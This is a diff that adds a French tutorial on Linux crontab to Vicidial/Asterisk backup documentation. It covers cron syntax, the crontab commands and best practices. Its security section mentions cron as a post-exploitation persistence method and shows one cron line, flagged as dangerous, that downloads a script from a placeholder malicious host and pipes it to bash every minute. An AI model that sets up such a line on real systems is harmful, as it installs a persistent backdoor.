@@ -27,3 +27,222 @@ Dans Vicidial, le **crontab** est essentiel pour automatiser la sauvegarde de
 - **Sécurité et rétention :** Il permet de planifier des sauvegardes nocturnes (ou fréquentes) pour éviter la perte de données en cas de crash.
 - **Automatisation du nettoyage :** Il peut être configuré pour supprimer automatiquement les anciennes sauvegardes, évitant ainsi la saturation de l'espace disque.
 - **Récurrence :** Il garantit l'exécution continue et fiable de la sauvegarde (chaque jour, semaine, mois).
+
+
+
+---
+
+# 🧠 1. C’est quoi `crontab` ?
+
+`crontab` permet de **planifier des tâches automatiques** sur Linux.
+
+👉 Exemple :
+
+- Lancer un script tous les jours
+- Sauvegarder un serveur
+- Redémarrer un service
+
+📌 Le service derrière = **cron**
+
+---
+
+# ⏰ 2. Structure d’une tâche cron
+
+Une ligne de crontab =
+```
+
+* * * * * commande  
+│ │ │ │ │  
+│ │ │ │ └── Jour de la semaine (0-7) (dimanche = 0 ou 7)  
+│ │ │ └──── Mois (1-12)  
+│ │ └────── Jour du mois (1-31)  
+│ └──────── Heure (0-23)  
+└────────── Minute (0-59)
+
+```
+---
+
+# 📌 3. Exemples simples
+
+### 🕐 Exécuter toutes les minutes
+
+```
+* * * * * /script.sh
+```
+
+---
+
+### 🕛 Tous les jours à minuit
+
+```
+0 0 * * * /backup.sh
+```
+
+---
+
+### 📅 Tous les lundis à 8h
+
+```
+0 8 * * 1 /script.sh
+
+```
+---
+
+### ⏱️ Toutes les 5 minutes
+
+```
+*/5 * * * * /script.sh
+```
+
+---
+
+# ⚙️ 4. Commandes importantes
+
+### ✏️ Éditer le crontab
+
+```
+crontab -e
+```
+
+---
+
+### 📄 Voir les tâches
+
+```
+crontab -l
+```
+
+---
+
+### 🗑️ Supprimer toutes les tâches
+
+```
+crontab -r
+```
+
+---
+
+# 🔐 5. Crontab et sécurité (TRÈS IMPORTANT)
+
+## ⚠️ a) Risques
+
+Un crontab mal utilisé peut :
+
+- Exécuter du code malveillant automatiquement
+- Maintenir un accès (backdoor)
+- Lancer un script caché toutes les minutes
+
+👉 Très utilisé en **post-exploitation (hacking)**
+
+---
+
+## 🔍 b) Vérification (audit sécurité)
+
+Toujours vérifier :
+
+```
+crontab -l
+```
+
+Et aussi :
+
+```
+cat /etc/crontab  
+ls /etc/cron.*
+```
+
+---
+
+## 🚨 c) Exemple de tâche suspecte
+
+```
+* * * * * curl http://malicious-site.com/shell.sh | bash
+
+```
+👉 ⚠️ dangereux : télécharge et exécute un script
+
+---
+
+# 🛡️ 6. Bonnes pratiques
+
+### ✅ Toujours :
+
+- Utiliser chemins absolus (`/usr/bin/python3`)
+- Rediriger les logs
+
+```
+0 2 * * * /backup.sh >> /var/log/backup.log 2>&1
+```
+
+---
+
+### 🔒 Limiter les accès :
+
+- `/etc/cron.allow`
+- `/etc/cron.deny`
+
+---
+
+### 👀 Surveiller :
+
+- fichiers modifiés
+- tâches inconnues
+
+---
+
+# ⚡ 7. Cas pratique (serveur Asterisk)
+
+👉 Tu peux utiliser `crontab` pour :
+
+### 📞 Redémarrer Asterisk chaque nuit
+
+```
+0 3 * * * systemctl restart asterisk
+```
+
+---
+
+### 📊 Sauvegarde config Asterisk
+
+```
+0 1 * * * tar -czf /backup/asterisk.tar.gz /etc/asterisk
+```
+
+---
+
+### 🛡️ Nettoyer les logs
+
+```
+0 0 * * * find /var/log/asterisk -type f -mtime +7 -delete
+```
+
+---
+
+# 🧠 8. Astuces utiles
+
+### 🔢 Utiliser des listes
+
+```
+0 6,18 * * * /script.sh
+```
+
+👉 6h et 18h
+
+---
+
+### ➖ Utiliser des plages
+
+```
+0 9-17 * * 1-5 /script.sh
+```
+
+👉 heures de bureau
+
+---
+
+# 🎯 9. Résumé simple
+
+- `crontab` = automatisation des tâches
+- Format = `minute heure jour mois jour_semaine`
+- Très puissant… mais dangereux si mal utilisé
+- Toujours surveiller en sécurité
